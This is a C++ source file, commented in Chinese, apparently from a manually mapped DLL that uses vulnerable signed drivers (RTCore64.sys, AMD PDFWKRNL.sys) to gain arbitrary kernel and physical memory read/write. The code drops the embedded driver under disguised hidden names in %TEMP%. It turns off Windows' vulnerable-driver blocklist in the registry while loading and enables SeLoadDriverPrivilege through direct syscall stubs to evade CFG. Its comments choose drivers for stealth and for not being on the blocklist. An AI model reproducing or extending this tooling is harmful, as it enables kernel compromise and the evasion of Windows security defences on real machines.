    static uint64_t PFN_TO_PA_LARGE(uint64_t entry) {
        return (entry & 0x0000FFFFFFE00000ULL) & ~(1ULL << 63);
    }

    // 通过 RTCore64 物理内存映射读取 8 字节
    uint64_t ReadPhysQword(uint64_t physicalAddr) {
        uint64_t value = 0;
        m_kma.ReadPhysical(physicalAddr, &value, sizeof(value));
        return value;
    }

    uint64_t m_cr3;
    KernelMemoryAccessor& m_kma;
};

// ============================================================
// BYOVD 驱动定义
// ============================================================

// (IOCTL 常量定义已移至文件顶部 VirtualReadViaIOCTL 之前)

const BYOVDDriverInfo BYOVDDrivers::RTCore64 = {
    L"RTCore64Svc",
    L"RTCore64 Micro-Star Driver",
    L"\\\\.\\RTCore64",
    L"RTCore64.sys",
    IOCTL_VIRTUAL_MEM,   // ★ v3.114: 使用虚拟内存 IOCTL (0x80002000)
    true
};

// ★ BUILD 489: PDFWKRNL.sys — AMD PDF Worker 内核驱动
//   IOCTL 0x80002014: kernel VA memcpy R/W (METHOD_BUFFERED, 无安全检查)
//   优势: 2026年未被 Microsoft 漏洞驱动阻止列表拦截
//   设备: \Device\PdfwKrnl → \\.\PdfwKrnl
const BYOVDDriverInfo BYOVDDrivers::PDFWKRNL = {
    L"PdfwKrnlSvc",
    L"AMD PDF Worker Kernel Driver",
    L"\\\\.\\PdfwKrnl",
    L"PDFWKRNL.sys",
    IOCTL_AMDPDFW_MEMCPY,  // 0x80002014
    false                  // 不需要先映射物理内存
};

// ★ BUILD 490: 仅 PDFWKRNL — 安全性更高:
//   1. 未被 Microsoft 漏洞驱动阻止列表拦截 (RTCore64 已被拦截)
//   2. METHOD_BUFFERED IOCTL, 无物理内存映射风险
//   3. AMD 官方驱动, 签名可信度高, 隐蔽性更好
//   4. 简单 memcpy 原语, 不涉及 MmMapIoSpace 等高风险操作
static const BYOVDDriverInfo* g_driverCandidates[] = {
    &BYOVDDrivers::PDFWKRNL,
};

const BYOVDDriverInfo* BYOVDDrivers::GetAllCandidates() {
    return g_driverCandidates[0];
}

int BYOVDDrivers::GetCandidateCount() {
    return sizeof(g_driverCandidates) / sizeof(g_driverCandidates[0]);
}

// ============================================================
// KernelMemoryAccessor 实现
// ============================================================

KernelMemoryAccessor& KernelMemoryAccessor::Instance() {
    static KernelMemoryAccessor inst;
    return inst;
}

bool KernelMemoryAccessor::IsHVCIEnabled() {
    // 方法1: 注册表检测
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD hvci = 0, size = sizeof(DWORD);
        RegQueryValueExW(hKey, L"HypervisorEnforcedCodeIntegrity",
            nullptr, nullptr, (LPBYTE)&hvci, &size);
        RegCloseKey(hKey);
        if (hvci != 0) return true;
    }

    // 方法2: SystemCodeIntegrityInformation (0x67) 
    // 通过 NtQuerySystemInformation
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        using NtQuerySystemInfo_t = LONG(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
        auto pNtQsi = (NtQuerySystemInfo_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (pNtQsi) {
            struct { ULONG length; ULONG flags; } ci = {};
            ULONG retLen = 0;
            pNtQsi(0x67, &ci, sizeof(ci), &retLen);
            if (ci.flags & 0x01) return true; // CODEINTEGRITY_OPTION_ENABLED
        }
    }

    return false;
}

// ============================================================
// 确保 BYOVD 驱动文件存在 (嵌入式提取回退)
//
// ★ BUILD 496: 返回 const wchar_t* (静态缓冲区), 替代 std::wstring
//   优先级:
//   0. 给定路径直接存在 (MutateAndRandomizeDriver 已写入 %TEMP%)
//   1. System32\drivers\<name> (系统已安装)
//   2. %TEMP%\<name> (从嵌入字节提取)
// ============================================================
static const wchar_t* EnsureDriverFile(const wchar_t* driverName) {
    static wchar_t s_resultPath[MAX_PATH]; // 线程不安全, 但本模块单线程
    s_resultPath[0] = 0;

    // ★ v3.126q: 确保随机种子在此函数首次调用前已初始化
    static bool srandSeeded = false;
    if (!srandSeeded) { srand(GetTickCount() ^ __rdtsc()); srandSeeded = true; }

    // ★ v3.97: 0. 先检查给定路径是否直接存在
    if (GetFileAttributesW(driverName) != INVALID_FILE_ATTRIBUTES) {
        ByovdDiag("BYOVD:EnsureDriverFile: file exists at given path '%ls'\n", driverName);
        wcscpy_s(s_resultPath, driverName);
        return s_resultPath;
    }

    wchar_t sysPath[MAX_PATH];

    // 1. 检查 System32\drivers
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\drivers\\");
    wcscat_s(sysPath, driverName);

    if (GetFileAttributesW(sysPath) != INVALID_FILE_ATTRIBUTES) {
        wcscpy_s(s_resultPath, sysPath);
        return s_resultPath;
    }

    // 2. 从嵌入字节提取到 %TEMP%
    {
        const uint8_t* embedData = nullptr;
        size_t embedSize = 0;

        const wchar_t* baseName = driverName;
        const wchar_t* lastSlash = wcsrchr(baseName, L'\\');
        if (lastSlash) baseName = lastSlash + 1;

        if (wcscmp(baseName, L"RTCore64.sys") == 0) {
            embedData = stealth::embedded::RTCore64_data;
            embedSize = stealth::embedded::RTCore64_size;
            ByovdDiag("BYOVD:EnsureDriverFile: matched RTCore64, embed=0x%p size=%zu\n", embedData, embedSize);
        } else {
            ByovdDiag("BYOVD:EnsureDriverFile: driverName '%ls' != RTCore64.sys\n", driverName);
        }

        if (embedData && embedSize > 0) {
            static const wchar_t* randomPrefixes[] = {
                L"amdx", L"nvld", L"igfx", L"athw",
                L"rtwl", L"btw", L"iwl", L"netw",
                L"e2f", L"rtl", L"vmci", L"vhd",
                L"wd", L"usb", L"acpi", L"pci",
                L"hda", L"intel", L"amd", L"nvidia",
            };
            for (int retry = 0; retry < 5; retry++) {
                wchar_t tryPath[MAX_PATH];
                GetTempPathW(MAX_PATH, tryPath);
                const wchar_t* prefix = randomPrefixes[rand() % 20];
                wchar_t altName[64];
                swprintf_s(altName, L"%ls_%04X.sys", prefix, (rand() & 0xFFFF));
                wcscat_s(tryPath, altName);

                DeleteFileW(tryPath);
                HANDLE hFile = CreateFileW(tryPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
                                           nullptr, CREATE_ALWAYS,
                                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED,
                                           nullptr);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(hFile, embedData, (DWORD)embedSize, &written, nullptr);
                    FlushFileBuffers(hFile);
                    CloseHandle(hFile);
                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, embedSize, tryPath, retry);
                    wcscpy_s(s_resultPath, tryPath);
                    return s_resultPath;
                }
                ByovdDiag("BYOVD:EnsureDriverFile: CreateFileW FAILED for %ls (err=%u, retry=%d)\n", tryPath, GetLastError(), retry);
            }
        } else {
            ByovdDiag("BYOVD:EnsureDriverFile: embedData=0x%p or embedSize=%zu — skipping\n", embedData, embedSize);
        }
    }

    return nullptr;
}

// ★ v3.75: 强制停止并删除所有残留 RTCore64 服务
//   解决 STATUS_OBJECT_NAME_COLLISION (0xC0000035):
//   之前异常的进程退出导致 \Driver\RTCore64 内核对象未清理,
//   导致再次加载时 NtLoadDriver 返回重名冲突
//   通过 SCM ControlService(SERVICE_CONTROL_STOP) 触发 DriverUnload,
//   然后 NtUnloadDriver + DeleteService 彻底清理
static void ForceRemoveRTCore64Services() {
    // ★ BUILD 474: 替换 SCM 为纯注册表清理 — OpenSCManagerW 在手动映射 DLL 中崩溃
    HKEY hServices;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services", 0,
        KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) != ERROR_SUCCESS)
        return;

    DWORD idx = 0;
    while (idx < 512) {
        wchar_t name[256];
        DWORD nameLen = 256;
        if (RegEnumKeyExW(hServices, idx, name, &nameLen,
            nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
            break;
        bool isOurs = (wcsstr(name, L"RTCore64") == name)
                   || (wcsstr(name, L"SysMon") == name)
                   || (wcsstr(name, L"PdfwKrnl") == name);  // ★ BUILD 489
        if (isOurs) {
            ByovdDiag("BYOVD:ForceRemove: deleting stale service '%ls' (registry only, BUILD 474)\n", name);
            RegDeleteTreeW(hServices, name);
            // 不idx++ — 删除后索引变化
        } else {
            idx++;
        }
    }
    RegCloseKey(hServices);
}

// ★ BUILD 485: 缓存的 Nt* SSN — 在 Initialize 初期提取, LoadDriver 直接使用
//   避免 manual-mapped DLL 上下文中的 CFG 崩溃
static DWORD g_cachedSsnCreateKey   = 0;
static DWORD g_cachedSsnOpenKey     = 0;
static DWORD g_cachedSsnSetValueKey = 0;
static DWORD g_cachedSsnLoadDriver  = 0;
// ★ BUILD 490: EnablePrivilege 直接 syscall 所需 SSN
static DWORD g_cachedSsnOpenProcessToken      = 0;
static DWORD g_cachedSsnAdjustPrivilegesToken = 0;

bool KernelMemoryAccessor::LoadDriver(const wchar_t* serviceName,
                                       const wchar_t* driverPath) {
    // ★ BUILD 485: Win11 CFG 阻止 manual-mapped DLL 调用 advapi32→ntdll 包装.
    //   全部替换为 Nt* 直接 syscall stubs. SSN 已在 Initialize 中缓存.
    ByovdDiag("BYOVD:LoadDriver: ENTER (BUILD 490: PDFWKRNL.sys syscall stubs)\n");

    // 使用缓存的 SSN
    if (!g_cachedSsnCreateKey || !g_cachedSsnOpenKey ||
        !g_cachedSsnSetValueKey || !g_cachedSsnLoadDriver) {
        ByovdDiag("BYOVD:LoadDriver: cached SSN INVALID\n");
        return false;
    }

    // 生成 syscall stubs
    void* stCK = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnCreateKey);
    void* stOK = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnOpenKey);
    void* stSV = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnSetValueKey);
    void* stLD = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnLoadDriver);
    if (!stCK || !stOK || !stSV || !stLD) {
        if(stCK)VirtualFree(stCK,0,MEM_RELEASE); if(stOK)VirtualFree(stOK,0,MEM_RELEASE);
        if(stSV)VirtualFree(stSV,0,MEM_RELEASE); if(stLD)VirtualFree(stLD,0,MEM_RELEASE);
        return false;
    }

    using FnCK = NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,ULONG,PUNICODE_STRING,ULONG,PULONG);
    using FnOK = NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
    using FnSV = NTSTATUS(NTAPI*)(HANDLE,PUNICODE_STRING,ULONG,ULONG,PVOID,ULONG);
    using FnLD = NTSTATUS(NTAPI*)(PUNICODE_STRING);

    // 准备 NT 路径
    wchar_t fullPath[MAX_PATH];
    // ★ BUILD 496: driverPath 现在是 const wchar_t*, 使用 wcschr 替代 std::wstring::find
    if (!wcschr(driverPath, L'\\')) {
        GetSystemDirectoryW(fullPath, MAX_PATH);
        wcscat_s(fullPath, L"\\drivers\\");
        wcscat_s(fullPath, driverPath);
    } else {
        wcscpy_s(fullPath, driverPath);
    }
    wchar_t ntPath[MAX_PATH*2];
    if(fullPath[0]!=L'\\'||fullPath[1]!=L'\\')swprintf_s(ntPath,L"\\??\\%ls",fullPath);
    else wcscpy_s(ntPath,fullPath);

    // ★ BUILD 496: 手动构造注册表路径, 替代 std::wstring 拼接
    wchar_t knpBuf[512];
    swprintf_s(knpBuf, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%ls", serviceName);
    UNICODE_STRING kus; kus.Buffer=knpBuf; kus.Length=(USHORT)(wcslen(knpBuf)*2);
    kus.MaximumLength=kus.Length+2;
    OBJECT_ATTRIBUTES oa={}; InitializeObjectAttributes(&oa,&kus,OBJ_CASE_INSENSITIVE,nullptr,nullptr);

    HANDLE hKey=nullptr; ULONG disp=0; NTSTATUS st;
    st=reinterpret_cast<FnCK>(stCK)(&hKey,KEY_ALL_ACCESS,&oa,0,nullptr,REG_OPTION_NON_VOLATILE,&disp);
    ByovdDiag("BYOVD:LoadDriver: NtCreateKey → 0x%08X (hKey=0x%llX disp=%u)\n", (uint32_t)st, (uint64_t)hKey, disp);
    if(!NT_SUCCESS(st)){
        st=reinterpret_cast<FnOK>(stOK)(&hKey,KEY_ALL_ACCESS,&oa);
        ByovdDiag("BYOVD:LoadDriver: NtOpenKey fallback → 0x%08X (hKey=0x%llX)\n", (uint32_t)st, (uint64_t)hKey);
        if(!NT_SUCCESS(st)){ByovdDiag("BYOVD:LoadDriver: key open FAILED 0x%08X\n",(uint32_t)st);goto done;}
    }

    // 设置注册表值 (NtSetValueKey) — 手动初始化 UNICODE_STRING, 不调 RtlInitUnicodeString
    {
        UNICODE_STRING vn; NTSTATUS sv;
        #define SET_DWORD(n,v,label) do{vn.Buffer=const_cast<wchar_t*>(n);vn.Length=(USHORT)(wcslen(n)*2);vn.MaximumLength=vn.Length+2;sv=reinterpret_cast<FnSV>(stSV)(hKey,&vn,0,REG_DWORD,&v,sizeof(v));ByovdDiag("BYOVD:LoadDriver: NtSetValueKey(%ls=%u) → 0x%08X\n",n,v,(uint32_t)sv);}while(0)
        DWORD t=1; SET_DWORD(L"Type",t,0); DWORD s=3; SET_DWORD(L"Start",s,0); DWORD e=1; SET_DWORD(L"ErrorControl",e,0);
        #undef SET_DWORD
        const wchar_t* ipn=L"ImagePath"; vn.Buffer=const_cast<wchar_t*>(ipn);
        vn.Length=(USHORT)(wcslen(ipn)*2); vn.MaximumLength=vn.Length+2;
        st=reinterpret_cast<FnSV>(stSV)(hKey,&vn,0,REG_EXPAND_SZ,(PVOID)ntPath,(ULONG)((wcslen(ntPath)+1)*2));
        ByovdDiag("BYOVD:LoadDriver: NtSetValueKey(ImagePath) → 0x%08X val=%ls\n", (uint32_t)st, ntPath);
    }

    // ★ BUILD 489: 临时禁用漏洞驱动阻止列表 (Win11 可能拦截 RTCore64.sys, PDFWKRNL 不受影响)
    //   CI\Config\VulnerableDriverBlocklistEnable = 0 → 加载 → 恢复 = 1
    {
        // ★ BUILD 496: 固定字符串替代 std::wstring
        const wchar_t* ciPathStr = L"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\CI\\Config";
        UNICODE_STRING ciUs; ciUs.Buffer = const_cast<wchar_t*>(ciPathStr);
        ciUs.Length = (USHORT)(wcslen(ciPathStr) * 2);
        ciUs.MaximumLength = ciUs.Length + 2;
        OBJECT_ATTRIBUTES ciOa = {}; InitializeObjectAttributes(&ciOa, &ciUs, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        HANDLE hCIKey = nullptr;
        NTSTATUS ciSt = reinterpret_cast<FnOK>(stOK)(&hCIKey, KEY_SET_VALUE, &ciOa);
        if (NT_SUCCESS(ciSt)) {
            // 保存原始值 (如果有的话), 设为 0
            DWORD disableVal = 0;
            UNICODE_STRING vnVuln; 
            const wchar_t* vnName = L"VulnerableDriverBlocklistEnable";
            vnVuln.Buffer = const_cast<wchar_t*>(vnName);
            vnVuln.Length = (USHORT)(wcslen(vnName) * 2);
            vnVuln.MaximumLength = vnVuln.Length + 2;
            NTSTATUS svSt = reinterpret_cast<FnSV>(stSV)(hCIKey, &vnVuln, 0, REG_DWORD, &disableVal, sizeof(disableVal));
            ByovdDiag("BYOVD:LoadDriver: disable blocklist → 0x%08X (set VDBE=0)\n", (uint32_t)svSt);
        } else {
            ByovdDiag("BYOVD:LoadDriver: cannot open CI\\Config (0x%08X) — blocklist bypass skipped\n", (uint32_t)ciSt);
        }

        // ★ BUILD 489: 启用 SeLoadDriverPrivilege — NtLoadDriver 必需此权限
        //   0xC0000061 (STATUS_PRIVILEGE_NOT_HELD) 表示 token 中缺少此权限
        EnablePrivilege(L"SeLoadDriverPrivilege");
        ByovdDiag("BYOVD:LoadDriver: EnablePrivilege(SeLoadDriverPrivilege) done\n");

        // 调用 NtLoadDriver
        // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        wchar_t rp[512];
        swprintf_s(rp, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%ls", serviceName);
        UNICODE_STRING rus; rus.Buffer = rp; rus.Length = (USHORT)(wcslen(rp) * 2);
        rus.MaximumLength = rus.Length + 2;
        st = reinterpret_cast<FnLD>(stLD)(&rus);
        ByovdDiag("BYOVD:LoadDriver: NtLoadDriver(syscall) → 0x%08X\n", (uint32_t)st);

        // 恢复阻止列表
        if (hCIKey) {
            DWORD enableVal = 1;
            UNICODE_STRING vnVuln2;
            const wchar_t* vnName2 = L"VulnerableDriverBlocklistEnable";
            vnVuln2.Buffer = const_cast<wchar_t*>(vnName2);
            vnVuln2.Length = (USHORT)(wcslen(vnName2) * 2);
            vnVuln2.MaximumLength = vnVuln2.Length + 2;
            reinterpret_cast<FnSV>(stSV)(hCIKey, &vnVuln2, 0, REG_DWORD, &enableVal, sizeof(enableVal));
            NtClose(hCIKey);
        }
    }

done:
    VirtualFree(stCK,0,MEM_RELEASE); VirtualFree(stOK,0,MEM_RELEASE);
    VirtualFree(stSV,0,MEM_RELEASE); VirtualFree(stLD,0,MEM_RELEASE);
    return NT_SUCCESS(st)||st==0xC000010E;
}

bool KernelMemoryAccessor::UnloadDriver(const wchar_t* serviceName) {
    // ★ BUILD 474: 替换 NtUnloadDriver → RegDeleteTreeW
    //   manual-mapped DLL 上下文中 NtUnloadDriver = ACCESS_VIOLATION in ntdll
    //   只删除注册表键即可 (驱动代码未加载, 不存在卸载问题)
    HKEY hServices;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services", 0,
        KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) == ERROR_SUCCESS)
    {
        LONG result = RegDeleteTreeW(hServices, (LPWSTR)serviceName);
        RegCloseKey(hServices);
        ByovdDiag("BYOVD:UnloadDriver: %ls -> RegDeleteTree=%d (BUILD 474 skip NtUnloadDriver)\n",
            serviceName, (int)(result == ERROR_SUCCESS));
        return result == ERROR_SUCCESS;
    }
    return false;
}

bool KernelMemoryAccessor::EnablePrivilege(const wchar_t* privilegeName) {
    // ★ BUILD 490: Win11 CFG 阻止 manual-mapped DLL 调用 advapi32→ntdll,
    //   改用直接 syscall (NtOpenProcessToken + NtAdjustPrivilegesToken).
    //   SeLoadDriverPrivilege 的 LUID 是系统级常量 {10, 0}, 无需 LookupPrivilegeValueW.
    if (!g_cachedSsnOpenProcessToken || !g_cachedSsnAdjustPrivilegesToken) {
        ByovdDiag("BYOVD:EnablePrivilege: SSN not cached, cannot use syscall fallback\n");
        return false;
    }

    // 生成 syscall stubs
    void* stOPT = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnOpenProcessToken);
    void* stAPT = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnAdjustPrivilegesToken);
    if (!stOPT || !stAPT) {
        if (stOPT) VirtualFree(stOPT, 0, MEM_RELEASE);
        if (stAPT) VirtualFree(stAPT, 0, MEM_RELEASE);
        return false;
    }

    // NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)
    using FnOPT = NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, PHANDLE);
    HANDLE hToken = nullptr;
    NTSTATUS ns = reinterpret_cast<FnOPT>(stOPT)(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hToken);
    VirtualFree(stOPT, 0, MEM_RELEASE);
    if (!NT_SUCCESS(ns) || !hToken) {
        if (stAPT) VirtualFree(stAPT, 0, MEM_RELEASE);
        ByovdDiag("BYOVD:EnablePrivilege: NtOpenProcessToken → 0x%08X\n", ns);
        return false;
    }

    // NtAdjustPrivilegesToken: 启用 SeLoadDriverPrivilege (LUID={10, 0})
    using FnAPT = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart = 10;   // SE_LOAD_DRIVER_PRIVILEGE (well-known constant)
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ns = reinterpret_cast<FnAPT>(stAPT)(
        hToken,
        FALSE,
        &tp,
        sizeof(tp),
        nullptr,
        nullptr);
    VirtualFree(stAPT, 0, MEM_RELEASE);
    CloseHandle(hToken);

    bool ok = NT_SUCCESS(ns);
    ByovdDiag("BYOVD:EnablePrivilege: NtAdjustPrivilegesToken → 0x%08X (%s)\n",
        ns, ok ? "OK" : "FAILED");
    return ok;
}

// ============================================================
// 物理内存映射管理
// ============================================================

// 物理内存映射条目
struct PhysMemMapping {
    uint64_t physAddr;       // 映射的物理地址起始
    uint32_t size;           // 映射大小
    uint8_t* virtAddr;       // 映射到的用户态虚拟地址
};

// ★ v3.118: 固定数组, 避免 std::vector CRT 堆依赖
static constexpr size_t MAX_PHYS_MAPPINGS = 64;
static PhysMemMapping g_physMappings[MAX_PHYS_MAPPINGS] = {};
static int g_physMappingCount = 0;

bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
                                        uint8_t** outVirtAddr) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;

    // 页对齐
    uint64_t alignedAddr = physAddr & ~0xFFFULL;
    uint32_t alignedSize = ((physAddr + size - alignedAddr + 0xFFF) & ~0xFFF);

    // 检查是否已映射 (固定数组遍历)
    for (int mi = 0; mi < g_physMappingCount; mi++) {
        PhysMemMapping& m = g_physMappings[mi];
        if (m.physAddr == alignedAddr && m.size >= alignedSize) {
            *outVirtAddr = m.virtAddr + (physAddr - alignedAddr);
            return true;
        }
    }

    // ★ v3.100: 使用探测到的 IOCTL 码和格式进行物理内存映射
    //   替代旧的硬编码 {uint64_t, uint32_t, uint32_t} 格式

    // ★ v3.83: 保存关键全局变量到栈, 防止 IOCTL 映射覆盖 .data 段导致指针损坏
    uint8_t* savedBackupBuf    = ::g_backupBuf;
    SIZE_T   savedBackupLen    = ::g_backupLen;
    uint8_t* savedBackupCodeBase = ::g_backupCodeBase;

    // ★ v3.114: 物理内存映射使用 IOCTL_PHYSICAL_READ (0x80002048)
    uint32_t mapIoctl = g_probedReadIoctl ? g_probedReadIoctl : IOCTL_PHYSICAL_READ;
    ByovdDiag("BYOVD:Map: IOCTL REQ phys=0x%llX size=%u fmt=%d ioctl=0x%08X\n",
        (unsigned long long)alignedAddr, alignedSize, (int)g_probedIoctlFormat, mapIoctl);

    uint8_t* mappedAddr = nullptr;
    DWORD devErr = 0;
    bool ok = TryMapPhysical(m_hDevice, mapIoctl, alignedAddr,
                             g_probedIoctlFormat, &mappedAddr, &devErr);

    ByovdDiag("BYOVD:Map: IOCTL RSP ok=%d mappedVA=0x%llX err=%u\n",
        (int)ok, (unsigned long long)(uintptr_t)mappedAddr, devErr);

    // ★ v3.83: IOCTL 后立即 restore 全局变量 (若 .data 段被污染)
    if (::g_backupBuf != savedBackupBuf || ::g_backupCodeBase != savedBackupCodeBase || ::g_backupLen != savedBackupLen) {
        ByovdDiag("BYOVD:Map: DETECT .data corruption! restoring globals\n");
        ::g_backupBuf = savedBackupBuf;
        ::g_backupCodeBase = savedBackupCodeBase;
        ::g_backupLen = savedBackupLen;
    }

    if (!ok || !mappedAddr) {
        ByovdDiag("BYOVD:Map: FAILED — err=%u\n", devErr);
        return false;
    }

    // 缓存映射 (固定数组)
    if (g_physMappingCount < MAX_PHYS_MAPPINGS) {
        PhysMemMapping& mapping = g_physMappings[g_physMappingCount];
        mapping.physAddr = alignedAddr;
        mapping.size     = alignedSize;
        mapping.virtAddr = mappedAddr;
        g_physMappingCount++;
    } else {
        ByovdDiag("BYOVD:Map: MAX_PHYS_MAPPINGS (%zu) reached, evicting oldest\n", MAX_PHYS_MAPPINGS);
        // LRU: 移除最早条目, 新条目放在末尾
        memmove(&g_physMappings[0], &g_physMappings[1],
                (MAX_PHYS_MAPPINGS - 1) * sizeof(PhysMemMapping));
        g_physMappings[MAX_PHYS_MAPPINGS - 1] = {alignedAddr, alignedSize, mappedAddr};
        // count 不变
    }

    // ★ v3.78: 检测 IOCTL 映射是否覆盖了受保护区 (DLL代码/备份缓冲区)
    //   RTCore64 驱动已通过 MmMapIoSpace/MDL 修改了 PTE — 破坏已发生!
    //   检测到重叠后, 先从备份恢复被破坏的页面, 再返回 false
    bool doesOverlap = IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize);
    ByovdDiag("BYOVD:Map: overlapCheck=%d (regions=%d)\n",
        (int)doesOverlap, g_protectedRegionCount);

    if (doesOverlap) {
        ByovdDiag("BYOVD:MapPhysical: OVERLAP! mappedVA=0x%llX size=%u phys=0x%llX\n",
            (unsigned long long)mappedAddr, alignedSize, (unsigned long long)alignedAddr);

        // ★ v3.78: 主动恢复 — 逐页检查并修复被破坏的受保护区
        if (savedBackupBuf && savedBackupCodeBase && savedBackupLen > 0) {
            uintptr_t overlapStart = (uintptr_t)mappedAddr;
            uintptr_t overlapEnd   = overlapStart + alignedSize;
            uintptr_t codeStart    = (uintptr_t)savedBackupCodeBase;
            uintptr_t codeEnd      = codeStart + savedBackupLen;

            ByovdDiag("BYOVD:Map: overlap range [0x%llX, 0x%llX) vs code [0x%llX, 0x%llX)\n",
                (unsigned long long)overlapStart, (unsigned long long)overlapEnd,
                (unsigned long long)codeStart, (unsigned long long)codeEnd);

            // 找到映射与代码区的交集
            uintptr_t restoreStart = (overlapStart > codeStart) ? overlapStart : codeStart;
            uintptr_t restoreEnd   = (overlapEnd   < codeEnd)   ? overlapEnd   : codeEnd;

            if (restoreStart < restoreEnd) {
                SIZE_T restoreOff = restoreStart - codeStart;
                SIZE_T restoreSz  = restoreEnd - restoreStart;
                BYTE* restoreDst  = (BYTE*)restoreStart;
                BYTE* restoreSrc  = savedBackupBuf + restoreOff;

                ByovdDiag("BYOVD:Map: restoring %llu bytes at off=%llu\n",
                    (unsigned long long)restoreSz, (unsigned long long)restoreOff);

                // 逐页恢复, 保存/恢复原始保护
                SIZE_T restoredBytes = 0;
                while (restoredBytes < restoreSz) {
                    SIZE_T chunk = ((restoreSz - restoredBytes) < 0x1000)
                        ? (restoreSz - restoredBytes) : 0x1000;
                    void* pageVA = restoreDst + restoredBytes;

                    // 跳过 VEH handler 所在页 (保持不变)
                    if (::g_vehHandlerPageVA && (uintptr_t)pageVA == (uintptr_t)::g_vehHandlerPageVA) {
                        ByovdDiag("BYOVD:Map: skip VEH handler page @0x%llX\n", (unsigned long long)pageVA);
                        restoredBytes += chunk;
                        continue;
                    }

                    DWORD oldProt = 0, dummy = 0;
                    BOOL vpOk = VirtualProtect(pageVA, chunk, PAGE_READWRITE, &oldProt);
                    if (!vpOk) {
                        ByovdDiag("BYOVD:Map: VirtualProtect FAILED @0x%llX err=%u\n",
                            (unsigned long long)pageVA, GetLastError());
                        restoredBytes += chunk;
                        continue;
                    }
                    memcpy(pageVA, restoreSrc + restoredBytes, chunk);
                    // 恢复原始保护 (非强制 EXECUTE_READ)
                    VirtualProtect(pageVA, chunk,
                        (oldProt == PAGE_READWRITE) ? PAGE_READWRITE : PAGE_EXECUTE_READ,
                        &dummy);
                    restoredBytes += chunk;
                }
                ByovdDiag("BYOVD:MapPhysical: proactively restored %llu bytes from overlap\n",
                    (unsigned long long)restoredBytes);
            } else {
                ByovdDiag("BYOVD:Map: no intersection with code region\n");
            }
        } else {
            ByovdDiag("BYOVD:Map: no backup available for restore\n");
        }

        if (g_physMappingCount > 0) g_physMappingCount--;
        return false;
    }

    // LRU 淘汰 (固定数组)
    if (g_physMappingCount > MAX_PHYS_MAPPINGS) {
        // 不释放映射 (内核驱动管理), 只从列表中移除
        memmove(&g_physMappings[0], &g_physMappings[1],
                (MAX_PHYS_MAPPINGS - 1) * sizeof(PhysMemMapping));
        g_physMappingCount = MAX_PHYS_MAPPINGS;
    }

    *outVirtAddr = mappedAddr + (physAddr - alignedAddr);
    return true;
}

bool KernelMemoryAccessor::ReadPhysical(uint64_t physAddr, void* outBuf, size_t size) {
    // ★ v3.115: 物理内存读取 — 使用 PhysicalReadViaIOCTL (IOCTL 0x80002048, sub-code 0x12)
    //   物理地址通过 MmMapIoSpace 映射, 与虚拟地址 IOCTL 分离
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : IOCTL_PHYSICAL_READ;
    return PhysicalReadViaIOCTL(m_hDevice, ioctl, physAddr, outBuf, size);
}

bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, size_t size) {
    // ★ v3.115: 物理内存写入 — 使用 PhysicalWriteViaIOCTL (IOCTL 0x8000204C, sub-code 0x13)
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    uint32_t writeIoctl = g_probedWriteIoctl ? g_probedWriteIoctl : IOCTL_PHYSICAL_WRITE;
    return PhysicalWriteViaIOCTL(m_hDevice, writeIoctl, physAddr, inBuf, size);
}

// ============================================================
// 内核虚拟地址读写
// ★ v3.124: RTCore64 使用 PhysicalReadViaIOCTL (0x80002048) — 直接读写内核VA
// ★ BUILD 489: PDFWKRNL 使用 IOCTL 0x80002014 — memcpy 内核VA R/W
// ============================================================

// ★ BUILD 489: PDFWKRNL 内核VA读取 — 通过 IOCTL 0x80002014 memcpy
//   驱动内部: memcpy(outBuf, kernelVA, size) — 无安全检查
